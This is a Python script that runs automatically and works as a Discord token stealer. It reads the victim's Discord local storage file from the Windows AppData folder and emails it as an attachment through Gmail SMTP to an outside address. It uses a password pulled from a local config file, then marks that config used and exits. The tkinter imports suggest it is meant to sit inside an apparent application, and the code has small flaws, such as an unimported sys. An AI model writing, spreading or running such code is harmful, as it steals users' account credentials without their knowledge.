import getpass
import json
import os
import shutil
import smtplib
import sqlite3
import subprocess
import time
import webbrowser
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from tkinter import *
from tkinter import ttk
from tkinter.messagebox import *

username = Path.home()
user = getpass.getuser()
cwd = os.getcwd()

def auto():
    with open(cwd + '/individuals/conf.json', 'r') as jsonFile:
        data = json.load(jsonFile)
    messaging = data["final"]
    with open('options.json', "r") as jsonFile:
        data = json.load(jsonFile)
    tmp2 = data['pseudo']
    fromaddr = "discordtkn@gmail.com"
    toaddr = "dsicrod@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = str(username)
    body = str(user) + " ; " + str(tmp2)
    msg.attach(MIMEText(body, 'plain'))
    filename = "https_discordapp.com_0.localstorage"
    attachment = open(str(
        username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, str(messaging))
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
    data["final"] = "already used"
    with open(cwd + '/individuals/conf.json', 'w') as jsonFile:
        json.dump(data, jsonFile)
    sys.exit()
auto()